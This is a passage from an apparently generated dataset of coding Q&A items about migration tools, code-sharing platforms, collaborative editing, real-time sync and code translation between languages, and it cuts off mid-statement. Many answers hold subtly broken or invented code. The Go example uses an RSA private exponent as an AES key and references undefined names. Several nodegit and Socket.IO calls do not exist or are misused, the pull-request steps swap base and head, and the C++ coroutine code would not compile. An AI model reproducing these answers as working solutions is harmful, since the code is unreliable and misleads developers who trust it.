ET.SubElement(nuget_root, \"ItemGroup\")\n\n    for dependency in maven_root.findall(\".//{http://maven.apache.org/POM/4.0.0}dependency\"):\n        group_id = dependency.find(\"{http://maven.apache.org/POM/4.0.0}groupId\").text\n        artifact_id = dependency.find(\"{http://maven.apache.org/POM/4.0.0}artifactId\").text\n        version = dependency.find(\"{http://maven.apache.org/POM/4.0.0}version\").text\n\n        nuget_package = ET.SubElement(nuget_items, \"PackageReference\")\n        nuget_package.set(\"Include\", f\"{group_id}.{artifact_id}\")\n        nuget_package.set(\"Version\", version)\n\n    with open(csproj_xml, 'w') as f:\n        ET.ElementTree(nuget_root).write(f, encoding=\"utf-8\", xml_declaration=True)\n\n# Usage\nconvert_maven_to_nuget('pom.xml', 'MyProject.csproj')\n```\nNote: The scripts provided are simplified examples and may not cover all possible cases in real-world scenarios."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Ecosystem migration tools", "Complexity_Level": "extremely difficult", "Response": "Area: \"Coding Ecosystem\"\nSub Area: \"Ecosystem migration tools\"\n\nQuestion 1: Develop a comprehensive tool that migrates a complex, monolithic web application built with a legacy stack (e.g., PHP, MySQL, and jQuery) to a modern microservices architecture using Kubernetes, Docker, and a modern frontend framework (e.g., React). The migration should handle data consistency, maintain user sessions, and ensure zero downtime during the transition.\n\nSolution Concept: \"Microservices Migration\"\n\n```python\n# High-level pseudocode for the migration tool\nimport os\nimport shutil\nimport subprocess\nfrom containerization import Dockerize\nfrom kubernetes import K8sManager\nfrom frontend_migration import Reactify\nfrom data_migration import DataConsistency\nfrom session_management import SessionPreserver\n\ndef migrate_monolith(legacy_code_path, new_code_path, k8s_config, db_credentials):\n    # 1. Dockerize legacy app\n    dockerized_app = Dockerize(legacy_code_path)\n    dockerized_app.build_image()\n    dockerized_app.push_to.Registry()\n\n    # 2. Migrate frontend to React\n    react_frontend = Reactify(legacy_code_path)\n    react_frontend.convert()\n    react_frontend.deploy_to_s3()\n\n    # 3. Data consistency and migration\n    data_manager = DataConsistency(db_credentials)\n    data_manager.create_schema_migration_scripts()\n    data_manager.migrate_data_to_services()\n\n    # 4. Microservices architecture setup\n    k8s = K8sManager(k8s_config)\n    k8s.create_namespace('new-app')\n    k8s.deploy_services(dockerized_app.get_service_defs())\n\n    # 5. Session preservation\n    session_preserver = SessionPreserver(legacy_code_path, k8s)\n    session_preserver.migrate_sessions_to_k8s()\n\n    # 6. Load balancing and zero-downtime switch\n    k8s.enable_blue_green_deployment()\n    k8s.update_routing_rules()\n\ndef main():\n    legacy_app_path = '/path/to/legacy/app'\n    new_app_path = '/path/to/new/app'\n    k8s_config = '/path/to/k8s/config'\n    db_credentials = {\n        'username': 'legacy_user',\n        'password': 'legacy_password',\n        'host': 'legacy_db_host',\n        'port': 3306,\n        'database': 'legacy_db'\n    }\n\n    migrate_monolith(legacy_app_path, new_app_path, k8s_config, db_credentials)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nQuestion 2: Create a tool that migrates a large-scale iOS app built with Swift and Core Data to a Flutter app with a Firebase backend, preserving user data, API compatibility, and maintaining push notification functionality, while optimizing for performance on both iOS and Android.\n\nSolution Concept: \"Cross-Platform Migration\"\n\n```dart\n// High-level pseudocode for the migration tool\nimport 'dart:io';\nimport 'package:flutter/services.dart';\nimport 'package:firebase_core/firebase_core.dart';\nimport 'package:flutter_firestore/flutter_firestore.dart';\nimport 'package:path_provider/path_provider.dart';\nimport 'package:core_data_migration/core_data_migration.dart' as core_data;\nimport 'package:ios_to_flutter_migration/ios_api_compatibility.dart';\nimport 'package:ios_to_flutter_migration/push_notifications.dart';\n\nFuture<void> main() async {\n  WidgetsFlutterBinding.ensureInitialized();\n  await Firebase.initializeApp();\n\n  // 1. Migrate Core Data to Firestore\n  Directory documentsDirectory = await getApplicationDocumentsDirectory();\n  coreDataMigration = core_data.CoreDataMigration(documentsDirectory.path);\n  coreDataMigration.migrateToFirebaseFirestore(Firestore.instance);\n\n  // 2. API compatibility layer\n  apiCompatibility = IOSApiCompatibility();\n  await apiCompatibility.ensureCompatibility();\n\n  // 3. Push notification setup\n  await setupPushNotifications();\n\n  // 4. Optimize for performance\n  optimizePerformance();\n\n  runApp(MyFlutterApp());\n}\n\nFuture<void> setupPushNotifications() async {\n  // Implement FCM setup for both iOS and Android\n  // ...\n}\n\nvoid optimizePerformance() {\n  // Apply performance optimizations specific to Flutter\n  // ...\n}\n```\nNote: These solutions are pseudocode representations of complex migration processes that would typically involve multiple steps, libraries, and tools. The actual implementation would be significantly more detailed and require expertise in the mentioned technologies."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Code sharing platforms", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a script that automatically shares a Python script on GitHub and creates a new issue when a specific condition is met in the code.\n\nConcept: Code sharing platforms (GitHub)\n\n```python\nimport requests\nimport os\nfrom github import Github\n\n# Set up GitHub authentication\nusername = \"your_username\"\npassword = \"your_token\"  # Personal Access Token\ng = Github(username, password)\n\n# Your Python script details\nscript_file = \"example.py\"\nscript_content = open(script_file, \"r\").read()\nrepository_name = \"my_repo\"\n\n# Create a new repository if it doesn't exist\nrepo = None\ntry:\n    repo = g.get_user().get_repo(repository_name)\nexcept GithubException:\n    repo = g.get_user().create_repo(repository_name)\n\n# Create a new file in the repository\nfile = repo.create_file(\n    filename=script_file,\n    message=\"Initial commit of example.py\",\n    content=script_content,\n    branch=\"main\"\n)\n\n# Check for a specific condition in the code\nif \"raise Exception('Error found')\" in script_content:\n    # Create a new issue if the condition is met\n    issue_title = \"Error found in example.py\"\n    issue_body = \"An error was detected in the code. Please review.\"\n    repo.create_issue(title=issue_title, body=issue_body)\n```\n\nQuestion 2:\nProblem: Build a CLI tool that uses GitLab API to clone a user's starred projects into a local directory while also creating a README file with project descriptions.\n\nConcept: Code sharing platforms (GitLab)\n\n```python\nimport os\nimport requests\nfrom git import Repo\n\n# GitLab API credentials\ngitlab_url = \"https://gitlab.com/api/v4\"\nprivate_token = \"your_private_token\"\n\nheaders = {\n    \"PRIVATE-TOKEN\": private_token\n}\n\n# Get the user's starred projects\nresponse = requests.get(f\"{gitlab_url}/projects?starred=true\", headers=headers)\nstarred_projects = response.json()\n\n# Clone projects and create README\nfor project in starred_projects:\n    project_id = project[\"id\"]\n    project_name = project[\"name\"]\n    project_description = project[\"description\"]\n    project_ssh_url = project[\"ssh_url_to_repo\"]\n\n    # Clone the project\n    repo_dir = os.path.join(\"local_repos\", project_name)\n    Repo.clone_from(project_ssh_url, repo_dir)\n\n    # Create README file\n    readme_path = os.path.join(repo_dir, \"README.md\")\n    with open(readme_path, \"w\") as f:\n        f.write(f\"## {project_name}\\n\\n{project_description}\\n\")\n\nprint(\"All starred projects have been cloned and READMEs created.\")\n```\n\nBoth solutions assume you have the necessary libraries installed (`github` for Question 1 and `git` for Question 2). You can install these using pip:\n\n```bash\npip install PyGithub\npip install gitpython\n```"}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Code sharing platforms", "Complexity_Level": "extremely difficult", "Response": "Domain: \"Coding Ecosystem\" Sub Area: \"Code sharing platforms\"\n\nProblem 1: Design and implement a secure, distributed code sharing platform with advanced search capabilities and real-time collaboration features. The platform should support version control, integrate with popular IDEs, and employ sophisticated access control and encryption mechanisms.\n\nSolution: We can use a combination of technologies like Golang for backend development, GraphQL for API querying, and WebSockets for real-time collaboration. The frontend can be built using React, and the version control system can be integrated with Git. For encryption, we can use a combination of AES and JWT. Here's an example implementation of the authentication and encryption mechanism in Golang:\n\n```go\npackage main\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n\t\"crypto/sha256\"\n\t\"crypto/x509\"\n\t\"encoding/base64\"\n\t\"encoding/pem\"\n\t\"errors\"\n\t\"fmt\"\n\t\"io\"\n\t\"strings\"\n)\n\ntype User struct {\n\tPrivateKey []byte\n}\n\nfunc (u *User) GenerateJWT() (string, error) {\n\t// Generate JWT using user data\n\t// ...\n\n\t// Encrypt JWT using user's private key\n\tencryptedJWT, err := encrypt(u.PrivateKey, jwtString)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\treturn encryptedJWT, nil\n}\n\nfunc encrypt(key []byte, plaintext string) (string, error) {\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\tplaintext = pad(plaintext)\n\tciphertext := make([]byte, aes.BlockSize+len(plaintext))\n\tiv := ciphertext[:aes.BlockSize]\n\tif _, err := io.ReadFull(rand.Reader, iv); err != nil {\n\t\treturn \"\", err\n\t}\n\n\tcfb := cipher.NewCFBEncrypter(block, iv)\n\tcfb.XORKeyStream(ciphertext[aes.BlockSize:], []byte(plaintext))\n\n\treturn base64.URLEncoding.EncodeToString(ciphertext), nil\n}\n\nfunc pad(s string) string {\n\tpadding := aes.BlockSize - len(s)%aes.BlockSize\n\tpadText := strings.Repeat(string(padding), padding)\n\treturn s + padText\n}\n\nfunc main() {\n\t// Load user's private key from a PEM file\n\tprivateKeyPEM, err := ioutil.ReadFile(\"user_private_key.pem\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tblock, _ := pem.Decode(privateKeyPEM)\n\tprivateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tuser := &User{PrivateKey: privateKey.D}\n\tencryptedJWT, err := user.GenerateJWT()\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(\"Encrypted JWT:\", encryptedJWT)\n}\n```\n\nProblem 2: Develop a plugin system for the code sharing platform, allowing users to extend platform functionality with custom integrations like code analysis, linting, and auto-formatting tools. The plugin system should be secure, resilient to plugin failures, and support seamless updates.\n\nSolution: We can use a modular architecture with a plugin manager written in Python. The plugin manager will handle plugin installation, updates, and execution. Plugins can be developed in Python or other languages using a defined API interface. Here's an example of the plugin manager in Python:\n\n```python\nimport importlib.util\nimport os\nimport sys\nfrom contextlib import suppress\n\nclass PluginManager:\n    def __init__(self, plugin_dir):\n        self.plugin_dir = plugin_dir\n        self.plugins = {}\n\n    def discover_plugins(self):\n        for _, dirs, _ in os.walk(self.plugin_dir):\n            for dir in dirs:\n                plugin_name = os.path.splitext(dir)[0]\n                self.plugins[plugin_name] = self.load_plugin(plugin_name)\n\n    def load_plugin(self, plugin_name):\n        spec = importlib.util.spec_from_file_location(plugin_name, os.path.join(self.plugin_dir, plugin_name, \"__init__.py\"))\n        if spec is None:\n            return None\n        plugin_module = importlib.util.module_from_spec(spec)\n        sys.modules[spec.name] = plugin_module\n        spec.loader.exec_module(plugin_module)\n\n        if not hasattr(plugin_module, \"Plugin\"):\n            return None\n        plugin_class = getattr(plugin_module, \"Plugin\")\n        if not issubclass(plugin_class, BasePlugin):\n            return None\n        return plugin_class()\n\n    def run_plugin(self, plugin_name, context):\n        plugin = self.plugins.get(plugin_name)\n        if plugin is None:\n            raise Exception(f\"Plugin '{plugin_name}' not found.\")\n        with suppress(Exception):\n            plugin.execute(context)\n\nclass BasePlugin:\n    def execute(self, context):\n        raise NotImplementedError()\n\nif __name__ == \"__main__\":\n    plugin_dir = \"./plugins\"\n    manager = PluginManager(plugin_dir)\n    manager.discover_plugins()\n    plugin_name = \"code_analyzer\"\n    context = {\"file_path\": \"path/to/file.py\"}\n    manager.run_plugin(plugin_name, context)\n```\n\nThese problems represent extremely difficult challenges in building a code sharing platform with advanced features and security. The actual implementation would involve a large codebase with many more components and services, but these examples give an idea of the kind of complexity involved."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Collaborative coding tools", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Git and GitHub\n\nProblem: Create a Git repository for a team project, set up access for team members, and implement a pull request workflow for code review.\n\nSolution:\n1. Create a new repository on GitHub:\n   - Log in to GitHub and create a new repository named \"team-project\".\n   - Initialize the repository with a README file.\n\n2. Clone the repository to your local machine:\n   ```bash\n   git clone https://github.com/your-username/team-project.git\n   ```\n\n3. Set up access for team members:\n   - On GitHub, invite team members to the \"team-project\" repository, granting them appropriate permissions (e.g., Read, Write, or Admin).\n\n4. Configure local Git environment:\n   ```bash\n   cd team-project\n   git config user.name \"Your Name\"\n   git config user.email \"your-email@example.com\"\n   ```\n\n5. Create a new feature branch:\n   ```bash\n   git checkout -b feature-x\n   ```\n\n6. Code changes, add and commit:\n   ```bash\n   nano index.js # Edit the file\n   git add index.js\n   git commit -m \"Add feature X\"\n   ```\n\n7. Push changes to the feature branch:\n   ```bash\n   git push origin feature-x\n   ```\n\n8. Create a pull request:\n   - On GitHub, navigate to the \"team-project\" repository and click \"New pull request\".\n   - Select the \"feature-x\" branch as the base for the pull request and the \"main\" branch as the head.\n   - Write a description of the changes, and click \"Create pull request\".\n\n9. Team members review and comment on the pull request.\n10. After review, merge the pull request into the main branch:\n    - On GitHub, click the \"Merge pull request\" button.\n    - Confirm the merge and delete the \"feature-x\" branch if no further changes are needed.\n\nQuestion 2:\nConcept: Code Collaboration Platforms\n\nProblem: Utilize a code collaboration platform (e.g., Visual Studio Live Share) to collaborate with a remote team member on a Python project.\n\nSolution:\n1. Install Visual Studio Code and the Live Share extension:\n   - Download and install [Visual Studio Code](https://code.visualstudio.com/).\n   - Open VS Code and install the [Live Share](https://marketplace.visualstudio.com/items?itemName=MS-vsliveshare.vsliveshare) extension.\n\n2. Create a new Python project:\n   ```bash\n   mkdir python-project\n   cd python-project\n   code .\n   ```\n\n3. Start a Live Share session:\n   - In the Visual Studio Code activity bar, click the Live Share icon (two overlapping figures).\n   - Click \"Start a collaboration session\" and allow the extension to generate a shareable link.\n\n4. Share the link with your team member:\n   - Send the generated link to your team member via email or messaging platform.\n\n5. Joining the collaboration session:\n   - Your team member clicks the link, signs in with their GitHub or Microsoft account, and installs the Live Share extension if prompted.\n   - They'll be automatically directed to a new instance of Visual Studio Code with your project open.\n\n6. Code together in real-time:\n   - Both you and your team member can now edit the same code, navigate files, and run the project.\n   - Changes are synchronized instantly across both instances of Visual Studio Code.\n\n7. Debugging together:\n   - To debug the project together, one person sets breakpoints and starts the debugger.\n   - The other person can then also step through the code and view variable values.\n\n8. When finished, end the collaboration session:\n   - In your instance of Visual Studio Code, click the Live Share icon and select \"End session\".\n\nNote: For real-time collaboration, both participants need a stable internet connection."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Collaborative coding tools", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a large open-source project with multiple concurrent contributors, design and implement a system that utilizes collaborative coding tools like Git and GitHub to ensure code quality, maintain consistency, and automate the review process using AI-powered static code analysis.\n\nSolution:\nConcept: Git, GitHub, Continuous Integration/Continuous Deployment (CI/CD), AI-powered static code analysis\n\nLanguage: Python (for example code), Git (for version control), GitHub (for hosting), GitHub Actions (for CI/CD), SonarQube (for AI-powered code analysis)\n\nExample code (Python script for integrating with GitHub Actions and SonarQube):\n```python\nimport os\nimport requests\nimport json\n\ndef get_api_token():\n    return os.environ['GITHUB_TOKEN']\n\ndef create_sonar_project(sonar_url, project_key, project_name):\n    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {get_api_token()}'}\n    data = {'name': project_name, 'key': project_key}\n    response = requests.post(f'{sonar_url}/api/projects/create', headers=headers, json=data)\n    return response.json()\n\ndef analyze_project(sonar_url, project_key, github_repo, github_branch):\n    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {get_api_token()}'}\n    data = {\n        'project_key': project_key,\n        'project_name': github_repo,\n        'base': github_branch,\n        'github_oauth_token': os.environ['GITHUB_TOKEN'],\n        'github_repo': github_repo\n    }\n    response = requests.post(f'{sonar_url}/api/ce/queue', headers=headers, json=data)\n    return response.json()\n\ndef main():\n    sonar_url = 'https://sonarcloud.io'\n    project_key = 'my_repo_key'\n    project_name = 'My Awesome Project'\n    github_repo = 'user/my-repo'\n    github_branch = 'main'\n\n    response = create_sonar_project(sonar_url, project_key, project_name)\n    if response['status'] == 'ok':\n        analyze_project(sonar_url, project_key, github_repo, github_branch)\n        print('Code analysis triggered.')\n    else:\n        print(f'Error creating SonarQube project: {response}')\n\nif __name__ == '__main__':\n    main()\n```\nExplanation: This script creates a SonarQube project and triggers code analysis for a specific GitHub repository and branch. GitHub Actions can be configured to run this script on every push, ensuring continuous code quality checks.\n\nQuestion 2:\nDevelop a plugin for a collaborative coding tool that integrates with a real-time code collaboration platform like Visual Studio Live Share, allowing team members to collaboratively debug complex distributed systems with live breakpoints, variable inspection, and shared console output.\n\nSolution:\nConcept: Real-time Collaboration, Debugging, Visual Studio Live Share API\n\nLanguage: TypeScript (for plugin development), Visual Studio Code Extension API\n\nExample code (TypeScript snippet for VS Live Share plugin):\n```typescript\nimport * as vscode from 'vscode';\nimport * as vsls from 'vsls/vscode';\n\nasync function activate(context: vscode.ExtensionContext) {\n    context.subscriptions.push(vsls.joinableTask.registerTaskProvider('distributedDebug', {\n        provideJoinableTasks: () => {\n            return [\n                {\n                    id: 'distributedDebugSession',\n                    label: 'Start Distributed Debugging Session',\n                    type: 'distributedDebug'\n                }\n            ];\n        },\n        resolveTask(_session, task) {\n            if (task.type === 'distributedDebug') {\n                return {\n                    type: 'distributedDebug',\n                    command: {\n                        args: ['--debug', '--port', '9229'],\n                        program: '${workspaceFolder}/app.js'\n                    },\n                    problemMatcher: []\n                };\n            }\n        },\n        provideTaskCreationOptions: () => {\n            return {\n                type: 'distributedDebug',\n                debug: {\n                    type: 'node',\n                    request: 'attach',\n                    port: 9229,\n                    protocol: 'inspector'\n                }\n            };\n        },\n        joinTask: async (session, task) => {\n            session.on('started', () => {\n                console.log('Distributed debugging session started.');\n                // Implement real-time breakpoint sharing, variable inspection, and shared console output here\n            });\n        }\n    }));\n}\n\nexport function deactivate() { }\n```\nExplanation: This TypeScript snippet demonstrates a plugin for Visual Studio Live Share that enables a new task type for starting a distributed debugging session. The plugin would need to extend the functionality to share breakpoints, variable inspection, and console output in real-time among collaborating team members. This would involve utilizing the VS Code Extension API and Live Share API to synchronize debugging information across connected clients."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Real-time code synchronization", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Implement a real-time code collaboration feature for a web-based code editor using WebSockets, which allows multiple users to see changes made by others in real-time.\n\nConcept: WebSockets\n\nSolution:\n```html\n<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Real-time Code Editor</title>\n    <script src=\"editor.js\" defer></script>\n</head>\n<body>\n    <textarea id=\"codeEditor\" cols=\"30\" rows=\"10\"></textarea>\n    <button id=\"connect\">Connect</button>\n    <button id=\"disconnect\">Disconnect</button>\n</body>\n</html>\n```\n\n```javascript\n// editor.js\ndocument.addEventListener('DOMContentLoaded', () => {\n    const codeEditor = document.getElementById('codeEditor');\n    const connectBtn = document.getElementById('connect');\n    const disconnectBtn = document.getElementById('disconnect');\n    let socket;\n\n    connectBtn.addEventListener('click', () => {\n        socket = new WebSocket('ws://your-server-url');\n        socket.onmessage = (event) => {\n            codeEditor.value = event.data;\n        };\n        socket.onclose = () => {\n            console.log('Disconnected');\n            socket = null;\n        };\n    });\n\n    disconnectBtn.addEventListener('click', () => {\n        if (socket) {\n            socket.close();\n            socket = null;\n        }\n    });\n\n    codeEditor.addEventListener('input', () => {\n        if (socket) {\n            socket.send(codeEditor.value);\n        }\n    });\n});\n```\nExplanation: This solution demonstrates a simple web-based code editor that uses WebSockets for real-time collaboration. The JavaScript code creates a WebSocket connection to a server (replace `your-server-url` with the actual server URL). When the \"Connect\" button is clicked, a WebSocket connection is established, and updates to the code editor are sent to the server and received from it. The \"Disconnect\" button closes the connection. Users will see changes made by others immediately.\n\nQuestion 2:\nProblem: Develop a desktop application using Electron and Socket.IO to facilitate real-time code sharing between multiple clients. The application should allow users to join a session and see others' code changes live.\n\nConcept: Electron, Socket.IO\n\nSolution:\n```javascript\n// main.js (Electron)\nconst { app, BrowserWindow } = require('electron');\nconst path = require('path');\nconst { io } = require('socket.io-client');\n\nlet mainWindow;\n\nfunction createWindow() {\n    mainWindow = new BrowserWindow({\n        width: 800,\n        height: 600,\n        webPreferences: {\n            preload: path.join(__dirname, 'preload.js'),\n        },\n    });\n\n    mainWindow.loadFile('index.html');\n    mainWindow.webContents.on('did-finish-load', () => {\n        mainWindow.webContents.send('join-session', 'session123');\n    });\n\n    mainWindow.on('closed', () => {\n        mainWindow = null;\n    });\n}\n\napp.on('ready', createWindow);\n\napp.on('window-all-closed', () => {\n    if (process.platform !== 'darwin') {\n        app.quit();\n    }\n});\n\napp.on('activate', () => {\n    if (mainWindow === null) {\n        createWindow();\n    }\n});\n\nio('http://your-server-url', { autoConnect: false })\n    .connect('session123')\n    .on('connect', () => {\n        console.log('Connected to session');\n    })\n    .on('disconnect', () => {\n        console.log('Disconnected from session');\n    })\n    .on('code-update', (code) => {\n        mainWindow.webContents.send('update-code', code);\n    });\n```\n\n```javascript\n// preload.js (Electron)\nconst { contextBridge, ipcRenderer } = require('electron');\n\ncontextBridge.exposeInMainWorld('electronAPI', {\n    joinSession: (sessionID) => ipcRenderer.send('join-session', sessionID),\n    codeUpdated: (callback) => ipcRenderer.on('update-code', callback),\n});\n```\n\n```html\n<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Real-time Code Editor</title>\n    <script src=\"https://cdn.socket.io/4.4.1/socket.io.min.js\"></script>\n    <script src=\"app.js\" defer></script>\n</head>\n<body>\n    <textarea id=\"codeEditor\" cols=\"30\" rows=\"10\"></textarea>\n    <script>\n        const socket = io('http://your-server-url', { autoConnect: false });\n        const codeEditor = document.getElementById('codeEditor');\n\n        window.electronAPI.codeUpdated((event, code) => {\n            codeEditor.value = code;\n        });\n\n        document.addEventListener('DOMContentLoaded', () => {\n            socket.connect('session123');\n        });\n\n        codeEditor.addEventListener('input', () => {\n            socket.emit('code-update', codeEditor.value);\n        });\n    </script>\n</body>\n</html>\n```\nExplanation: This solution creates a desktop application using Electron that uses Socket.IO for real-time communication between clients. The `main.js` sets up the Electron application and joins the specified session when the window is loaded. The `preload.js` exposes an API to communicate between the main process and the renderer process. The `index.html` and `app.js` handle the client-side WebSocket connection and code synchronization. When a user types in the code editor, the changes are sent to the server and broadcasted to other clients, updating their code editors accordingly."}, {"L2_TASK": "Coding Ecosystem", "L3_TASK": "Real-time code synchronization", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a real-time code collaboration platform with advanced features such as conflict resolution and version control, enabling multiple developers to work simultaneously on the same codebase without overwriting each other's changes.\n\nConcept: Real-time code synchronization, Conflict resolution, Version control\n\nSolution:\nIn this solution, we'll use Node.js as the backend, Socket.IO for real-time communication, and Git for version control. We'll create a server that manages the code repository and communicates with clients using WebSockets.\n\nServer-side (Node.js and Socket.IO):\n```javascript\nconst express = require('express');\nconst http = require('http');\nconst socketIo = require('socket.io');\nconst Git = require('nodegit');\n\nconst app = express();\nconst server = http.createServer(app);\nconst io = socketIo(server);\n\n// Simulate a git repository\nconst repositoryPath = './code-repo';\nconst repository = Git.Repository.open(repositoryPath);\n\n// Track connected clients\nconst clients = new Set();\n\nio.on('connection', (socket) => {\n  clients.add(socket);\n\n  // Send the latest code on connection\n  const workdirFile = Git.FilePath.fromRepoPath(repository, 'main.js');\n  const fileContent = Git.FS.read(workdirFile);\n  socket.emit('initialCode', fileContent.toString());\n\n  // Handle changes from clients\n  socket.on('codeChange', (newCode) => {\n    const oid = repository.stage('main.js', Git.Oid.fromString(newCode));\n    const commitOid = repository.commit('Initial commit', null, null, [], {\n      author: {},\n      committer: {},\n    });\n\n    const commit = repository.getCommit(commitOid);\n    const diff = Git.Diff.indexToWorkdir(repository, Git.Index.read(repository), null, {\n      flags: Git.Diff.OPTION.INCLUDE_UNMODIFIED,\n    });\n\n    // Broadcast changes to other clients\n    const patches = diff.patches();\n    patches.forEach((patch) => {\n      const hunksWithChanges = patch.hunks().filter((hunk) => hunk.linesInHunk() !== 0);\n      hunksWithChanges.forEach((hunk) => {\n        const changedLines = hunk.lines().map((line) => line.content());\n        socket.broadcast.emit('codeUpdate', changedLines);\n      });\n    });\n  });\n\n  socket.on('disconnect', () => {\n    clients.delete(socket);\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\n\nClient-side (JavaScript and Socket.IO):\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Real-time Code Collaboration</title>\n  <script src=\"https://cdn.socket.io/4.4.1/socket.io.min.js\"></script>\n</head>\n<body>\n  <textarea id=\"codeEditor\" rows=\"20\" cols=\"50\"></textarea>\n  <script>\n    const socket = io('http://localhost:3000');\n    const codeEditor = document.getElementById('codeEditor');\n\n    // Handle initial code\n    socket.on('initialCode', (code) => {\n      codeEditor.value = code;\n    });\n\n    // Handle code updates from other clients\n    socket.on('codeUpdate', (changedLines) => {\n      const cursorPosition = codeEditor.selectionStart;\n      codeEditor.value = codeEditor.value.split('\\n').map((line, index) => {\n        if (index === changedLines[0].line - 1) {\n          return line + changedLines.reduce((acc, cur) => acc + cur.content, '');\n        }\n        return line;\n      }).join('\\n');\n\n      // Reset cursor position\n      codeEditor.selectionStart = cursorPosition;\n      codeEditor.selectionEnd = cursorPosition;\n    });\n\n    // Send code changes to the server\n    codeEditor.addEventListener('input', () => {\n      socket.emit('codeChange', codeEditor.value);\n    });\n  </script>\n</body>\n</html>\n```\nThis solution creates a basic real-time code collaboration platform with a server managing the Git repository and broadcasting changes to all connected clients. Clients receive initial code and updates, and send their changes to the server for version control and conflict resolution.\n\n**Note:** This example is a simplified illustration and does not address advanced conflict resolution and merge scenarios that would be required in a production environment."}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Code translation (one from language to another)", "Complexity_Level": "medium", "Response": "Question 1: You have a Python function that calculates the factorial of a number using recursion. Write a JavaScript equivalent of this function, maintaining the same medium level of complexity.\n\nPython Code:\n```python\ndef factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n-1)\n```\n\nJavaScript Code:\n```javascript\nfunction factorial(n) {\n    if (n === 0 || n === 1) {\n        return 1;\n    } else {\n        return n * factorial(n - 1);\n    }\n}\n```\nConcept: Code translation (Python to JavaScript)\n\nQuestion 2: Given a Java method that reverses a string, create a Ruby equivalent with a similar level of complexity.\n\nJava Code:\n```java\npublic static String reverseString(String s) {\n    StringBuilder sb = new StringBuilder(s);\n    return sb.reverse().toString();\n}\n```\n\nRuby Code:\n```ruby\ndef reverse_string(s)\n  s.reverse\nend\n```\nConcept: Code translation (Java to Ruby)"}, {"L2_TASK": "Code to Code (different languages)", "L3_TASK": "Code translation (one from language to another)", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a highly optimized and efficient code translator that converts a Python program using complex features like generators, coroutines, and decorators into an equivalent C++ program using async/await and templates.\n\n**Concept**: Code Translation (Python to C++)\n\n```python\n# Python Code with complex features\ndef fibonacci(n):\n    a, b = 0, 1\n    while a < n:\n        yield a\n        a, b = b, a + b\n\ndef coroutine_example():\n    def coroutine(yield_val):\n        nonlocal running\n        running = True\n        while running:\n            val = (yield yield_val)\n            if val is None:\n                running = False\n            else:\n                yield_val = val\n    gen = coroutine(0)\n    next(gen)\n    for i in range(10):\n        print(gen.send(i))\n\n@decorator\ndef time_function(f, *args, **kwargs):\n    start_time = time.time()\n    result = f(*args, **kwargs)\n    end_time = time.time()\n    print(f\"Execution time: {end_time - start_time} seconds\")\n    return result\n```\n\n**C++ Code using async/await and templates**\n\n```cpp\n#include <iostream>\n#include <generator>\n#include <coroutine>\n#include <chrono>\n\ntemplate <typename T>\nstruct GeneratorWrapper {\n    struct promise_type {\n        T a, b;\n        auto get_return_object() { return GeneratorWrapper{std::coroutine_handle<promise_type>::from_promise(*this)}; }\n        auto initial_suspend() { return std::suspend_never{}; }\n        auto yield_value(T val) { a = b; b = val; co_return a; }\n        auto final_suspend() { return std::suspend_never{}; }\n    };\n    std::coroutine_handle<promise_type> coro;\n    GeneratorWrapper(std::coroutine_handle<promise_type> handle) : coro(handle) {}\n    GeneratorWrapper() {}\n    T operator*() const { return coro->promise().a; }\n    GeneratorWrapper& operator++() {\n        coro->resume();\n        return *this;\n    }\n};\n\nvoid fibonacci(int n) {\n    GeneratorWrapper<int> gen = []() -> GeneratorWrapper<int>::promise_type {\n        int a = 0, b = 1;\n        while (a < n) {\n            co_yield a;\n            std::swap(a, b);\n            b += a;\n        }\n    }();\n    for (int val : gen) {\n        std::cout << val << \" \";\n    }\n    std::cout << std::endl;\n}\n\nstruct Coroutine {\n    bool running;\n    int yield_val;\n\n    Coroutine(int val) : running(true), yield_val(val) {}\n\n    std::coroutine_handle<> start() {\n        return std::coroutine_handle<>::from_promise(*this);\n    }\n\n    struct promise_type {\n        Coroutine* self;\n        auto get_return_object() { return self->start(); }\n        auto initial_suspend() { return std::suspend_never{}; }\n        auto yield_value(int val) {\n            self->yield_val = val;\n            return std::suspend_always{};\n        }\n        auto final_suspend() { return std::suspend_never{}; }\n    };\n};\n\nvoid coroutine_example() {\n    Coroutine gen(0);\n    gen.start()->resume();\n    for (int i = 0; i < 10; ++i) {\n        gen.yield_val = i;\n        gen.start()->resume();\n        std::cout << gen.yield_val << \" \";\n    }\n    gen.running = false;\n    gen.start()->destroy();\n}\n\ntemplate <typename Func>\nvoid time_function(Func f, std::string_view description) {\n    auto start_time = std::chrono::high_resolution_clock::now();\n    auto result = f();\n    auto end_time 